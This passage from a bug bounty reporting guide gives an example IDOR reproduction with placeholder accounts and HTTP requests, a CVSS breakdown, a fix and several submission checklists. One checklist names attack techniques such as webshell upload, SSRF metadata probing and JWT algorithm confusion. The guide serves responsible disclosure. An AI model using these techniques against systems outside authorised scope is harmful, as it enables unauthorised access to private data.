- State the action: "read any user's private messages"
- State the method: "by changing the conversation_id parameter"
- State the consequence: "exposes all private conversations"
- One to two sentences maximum
- No "potentially", "possibly", "could theoretically"
- Use present tense, active voice
```

### Technical Details

**Step-by-step reproduction:**

```
Prerequisites:
- Two test accounts: victim@test.com / VictimPass123 and attacker@test.com / AttackerPass123
- curl or similar HTTP client

Steps:
1. Log in as victim and create a document:
   POST /api/documents
   Authorization: Bearer <victim_token>
   Body: {"title": "Confidential Document", "content": "This is secret"}
   
2. Note the document ID from the response:
   Response: {"id": 1234, "title": "Confidential Document", ...}
   
3. Log out and log in as attacker:
   POST /api/auth/login
   Body: {"email": "attacker@test.com", "password": "AttackerPass123"}
   
4. Access victim's document using the noted ID:
   GET /api/documents/1234
   Authorization: Bearer <attacker_token>
   
5. Observe the response contains victim's document, not a 403 error:
   Response: {"id": 1234, "title": "Confidential Document", ...}
```

**Requirements:**
- Number every step
- Include exact request/response format
- Include test account credentials
- Each step takes under 10 seconds
- Total steps under 10
- Include expected vs actual results

### CVSS Vector String

Include the CVSS vector string and explain the scoring:

```
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N
Base Score: 6.5 (Medium)

Vector breakdown:
- AV:N (Attack Vector: Network) — attacker can exploit from anywhere
- AC:L (Attack Complexity: Low) — no special conditions required
- PR:L (Privileges Required: Low) — attacker needs a basic account
- UI:N (User Interaction: None) — victim doesn't need to do anything
- S:U (Scope: Unchanged) — impact stays within the application
- C:H (Confidentiality: High) — full read access to victim's documents
- I:N (Integrity: None) — attacker cannot modify documents
- A:N (Availability: None) — service remains available
```

### Remediation Suggestion

(Optional but valued by many programs)

```
Remediation:
Add an owner_id check to the document retrieval query:

-- Current (vulnerable):
SELECT * FROM documents WHERE id = $1

-- Fixed:
SELECT * FROM documents WHERE id = $1 AND owner_id = $current_user_id

On the application side:
// Current
const doc = await Document.findById(req.params.id);

// Fixed
const doc = await Document.findOne({
    where: { id: req.params.id, owner_id: req.user.id }
});
```

### Supporting Materials

```
Attachments:
1. [idor-victim-documents-api.target.com-2026-06-16-v1.png] — Screenshot showing
   victim's documents visible in attacker's session
2. [idor-poc-curl.sh] — curl script that reproduces the issue
3. [idor-har-sanitized.har] — HAR file with cookies and PII redacted
```

### The "Before You Write" Checklist

```
[ ] Title follows the formula [Severity] Vuln Type in Feature — Impact
[ ] Summary is one paragraph, no technical details
[ ] Impact statement starts with "An attacker could..."
[ ] Reproduction steps are numbered and complete
[ ] Test account credentials are included
[ ] CVSS vector is calculated and included
[ ] Severity is justified
[ ] Technical details include request/response pairs
[ ] Remediation suggestion is provided (optional)
[ ] Evidence files are named correctly
[ ] Evidence files are sanitized
[ ] No sensitive data in the report
[ ] The triager can reproduce in under 2 minutes
```

---

## 7. Pre-Submit Final Check

### 60-Second Pre-Submit Checklist

Read each item aloud and check it. If any check fails, STOP. Fix it before submitting.

```
[  ] SCOPED — I double-checked the program scope and my target is in scope
[  ] REPRODUCIBLE — I reproduced this from a fresh session 3 times
[  ] IMPACT REAL — I demonstrated real harm, not theoretical
[  ] EVIDENCE CLEAN — No cookies, no PII, no internal IPs in evidence
[  ] NOVEL — I searched prior art and this is different from known issues
[  ] SEVERITY CORRECT — I calculated CVSS, not guessed
[  ] REPORT CLEAR — A triager can reproduce this in under 2 minutes
[  ] TITLE RIGHT — [Severity] Vuln Type in Feature — Impact Summary
[  ] STEPS COMPLETE — Every step is numbered, has exact requests, has credentials
[  ] IMPACT STATED — "An attacker could..." paragraph is included
[  ] CVSS INCLUDED — Vector string and breakdown are in the report
[  ] EVIDENCE ATTACHED — Files are named, sanitized, and attached
[  ] NO SENSITIVE DATA — I checked every field in the report for leaks
[  ] RULES FOLLOWED — I read the program rules and followed all requirements
```

### Final Sanity Check

**"Would I accept my own report?"**

Ask yourself:

1. If I were a triager with 50 unread reports, would I accept this one?
2. Is the impact clear in the first 3 lines?
3. Can I reproduce it in under 2 minutes with the provided steps?
4. Is the evidence clear and sanitized?
5. Would I be embarrassed if this was marked N/A?

**If the answer to any of these is NO, do not submit yet.**

### The "One More Test" Rule

Before you hit submit, run one final reproduction test:

1. Close everything
2. Open a fresh browser
3. Follow your own reproduction steps exactly
4. If it works — submit
5. If it doesn't work — find out why and fix the steps

---

## 8. Post-Submit Optimization

### While Waiting for Triage

**Day 1-3: Normal**
- Keep hunting other targets
- Do not check the submission status every hour
- Do not tag or mention program managers

**Day 4-7: Mild concern**
- Check if the program has a target SLA (HackerOne: 7 days median)
- If urgent impact, consider sending a polite follow-up:
  "Hi team, I submitted finding X on [date]. I wanted to confirm you have everything you need to reproduce it. Happy to provide additional information."

**Day 8+: Escalation path**
- HackerOne: Contact support if SLA is exceeded
- Bugcrowd: Mediation process available
- Private programs: Contact the program manager directly (first check if this is allowed)

### Responding to Triager Questions

**When a triager asks for more information:**
- Respond within 24 hours (faster is better)
- Provide exactly what they ask for, nothing more
- Do not argue — triagers have the final say
- If they can't reproduce, offer to do a screen share or record a new video

**Templates:**

```
If they can't reproduce:
"Thanks for looking at this. Let me provide a more detailed reproduction.
I've recorded a video PoC showing each step from a clean session.
[Attach video] Please let me know if you need any additional information."

If they ask about scope:
"The endpoint is at api.target.com/v2/documents which falls under the
wildcard *.target.com in the program scope. I've attached a screenshot
of the scope page for reference."

If they question severity:
"I calculated the CVSS as 6.5 (Medium) because the attack requires
authentication (PR:L) but the impact is full document read access (C:H).
If you consider the data types exposed (PII + financial), this could
be considered High. Happy to discuss the scoring."
```

### When to Supply Additional Evidence

| Situation | Action |
|-----------|--------|
| Triager asks for more details | Provide immediately |
| Triager can't reproduce | Make a video PoC from scratch |
| Triager questions impact | Demonstrate a worse example |
| Triager asks about scope | Provide scope page screenshot |
| Triager is silent for 7+ days | Send a polite follow-up |
| Triager marks as N/A | Read the reason, learn, move on |

### When to Escalate

- HackerOne: 14+ days without response from triage
- Bugcrowd: 14+ days without response
- The finding involves active data exfiltration or user harm
- The program is non-responsive after multiple follow-ups

**Escalation channels:**
- HackerOne: Report to HackerOne security team (support@hackerone.com)
- Bugcrowd: Mediation process via platform
- Immunefi: Discord admin contact

### Learning from Rejections

Every N/A is a learning opportunity:

```
N/A reason: "This is a rate limiting issue"
Learning: Check if rate limiting is in scope before submitting

N/A reason: "This requires admin access"
Learning: Test with a standard user account, not your own

N/A reason: "This was reported last week"
Learning: Search disclosed reports more thoroughly

N/A reason: "We cannot reproduce with the steps provided"
Learning: Make reproduction steps simpler and more detailed
```

**Log every N/A:**

```
Date: 2026-06-16
Program: Target.com
Bug: IDOR in document access
N/A reason: Out of scope — old API version (v1)
Lesson: Always check each API version's scope separately
Fix: Next time, check the API version against the scope list
```

---

## 9. Comprehensive Master Checklist

A single condensed checklist that can be printed or referenced during hunting. Copy this into your notes and check off each item before submission.

### Phase 1: Discovery — The 7-Question Gate

```
[  ] Q1: REPRODUCIBLE — Bug reproduces from a clean session (3/3 attempts)
[  ] Q2: SECURITY BOUNDARY — Bug violates a clear security boundary
[  ] Q3: REAL HARM — Bug demonstrates real harm (not theoretical)
[  ] Q4: IN SCOPE — All affected assets are in scope (double-checked)
[  ] Q5: NOVEL — Prior art search complete, finding is distinct
[  ] Q6: CLEAR STEPS — Reproduction steps are numbered and actionable
[  ] Q7: CLEAN EVIDENCE — No cookies, PII, or internal IPs in evidence
```

### Phase 2: Reproducibility (Gate 1)

```
[  ] Reproduced from fresh incognito session (3/3)
[  ] curl command prepared as minimum viable PoC
[  ] Account prerequisites documented
[  ] Environment prerequisites documented
[  ] Tested across different conditions (IP, session, time, browser)
[  ] No timing-dependent flakiness
[  ] No token-scope dependency (tested with minimum-privilege account)
```

### Phase 3: Impact Assessment (Gate 2)

```
[  ] CVSS vector calculated (AV/AC/PR/UI/S/C/I/A)
[  ] CVSS base score assigned
[  ] Business impact articulated in one sentence
[  ] Severity tier selected (Critical/High/Medium/Low/Info)
[  ] Real data access demonstrated (not just "we could have")
[  ] Chain potential identified (if applicable)
[  ] No "could potentially" language used
```

### Phase 4: Scope & Rules (Gate 3)

```
[  ] Target domain/subdomain confirmed in scope
[  ] Out-of-scope list checked (no conflicts)
[  ] Program rules read and followed
[  ] Third-party service scope checked
[  ] Old API version scope checked
[  ] Acquisition-related scope checked
[  ] Automated scanning rules followed
[  ] Special program rules followed (testing hours, account limits)
[  ] Always-out-of-scope items verified
```

### Phase 5: Novelty & Prior Art (Gate 4)

```
[  ] Disclosed reports searched (H1/Bugcrowd/Intigriti)
[  ] Google search for similar findings done
[  ] GitHub search for related issues done
[  ] No identical findings found
[  ] If near-duplicate, differences clearly documented
[  ] Regression checked (was this previously fixed?)
[  ] Novelty justification written
```

### Phase 6: Class-Specific Validation

```
[  ] IDOR: Two accounts, all methods, all parameters
[  ] XSS: Context identified, CSP checked, filter bypass tested
[  ] SSRF: Callback server set up, metadata tested, internal IPs tested
[  ] SQLi: Time-based/error-based/OOB confirmed
[  ] Auth Bypass: Role enumeration, boundary testing, MFA tested
[  ] RCE: Command execution, file write, callback confirmed
[  ] Business Logic: Multi-step, state manipulation, financial tests
[  ] Race Condition: Concurrent requests, TOCTOU verified
[  ] File Upload: Webshell, XSS, path traversal tested
[  ] GraphQL: Introspection, batching, depth, auth flaws
[  ] SSTI: Engine identified, RCE escalation demonstrated
[  ] Prototype Pollution: Pollution detected, sink confirmed
[  ] Mass Assignment: Parameters brute-forced, privilege fields found
[  ] JWT: Algorithm confusion, key validation bypassed
[  ] Cache Poisoning: Cache key manipulation, victim delivery tested
[  ] HTTP Smuggling: CL.TE/TE.CL/H2.CL confirmed
```

### Phase 7: Evidence Package

```
[  ] Request/response captured (complete headers + body)
[  ] Screenshots taken (before + after comparison)
[  ] Cookies redacted (black bar, not blur)
[  ] PII masked (names, emails, phones, addresses)
[  ] Internal IPs redacted
[  ] Timestamps visible in evidence
[  ] URL bar visible in screenshots
[  ] HAR file sanitized (cookies, auth headers, PII removed)
[  ] Video PoC recorded (if needed) — under 90 seconds
[  ] curl PoC prepared and tested
[  ] Code-based PoC prepared (if complex)
[  ] Evidence files named correctly: [VULN]-[TARGET]-[DATE]-[VERSION].[ext]
```

### Phase 8: Report

```
[  ] Title follows formula: [Severity] Vuln Type in Feature — Impact
[  ] Summary is one paragraph, no technical details
[  ] Impact statement: "An attacker could [action] by [method], [consequence]"
[  ] Reproduction steps numbered (under 10 steps)
[  ] Test account credentials included
[  ] Exact requests/responses included
[  ] CVSS vector string included
[  ] CVSS breakdown explained
[  ] Severity clearly justified
[  ] Remediation suggestion included (optional)
[  ] Supporting materials listed
[  ] No sensitive data in report body
[  ] One final reproduction test from fresh session — PASSED
```

### Phase 9: Pre-Submit Final Check

```
[  ] SCOPED — Double-checked, finding is in scope
[  ] REPRODUCIBLE — Fresh session test passed (3/3)
[  ] IMPACT REAL — Demonstrated, not theoretical
[  ] EVIDENCE CLEAN — Sanitized and ready
[  ] NOVEL — Prior art search complete
[  ] SEVERITY CORRECT — CVSS calculated
[  ] REPORT CLEAR — Triager can reproduce in 2 minutes
[  ] RULES FOLLOWED — Program rules satisfied
[  ] FINAL TEST — One more fresh reproduction — WORKS
[  ] WOULD ACCEPT — I would accept this report as a triager
```

### Phase 10: Post-Submit

```
[  ] Submitted on platform (HackerOne/Bugcrowd/Immunefi/Intigriti)
[  ] Platform confirmation received
[  ] Report ID noted for tracking
[  ] Calendar reminder set for 7-day follow-up
[  ] Logged finding details (target, date, severity, status)
[  ] Continue hunting other targets
```

---

## Reference

- [First CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1)
- [HackerOne Disclosure Policy](https://hackerone.com/disclosure-guidelines)
- [Bugcrowd VRT Reference](https://bugcrowd.com/vrt)
- [Immunefi Standards](https://immunefi.com/severity)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- See also: `agents/validator.md`, `agents/triage-readiness.md`, `agents/p1-validator.md`
- See also: `skills/triage-validation/SKILL.md`
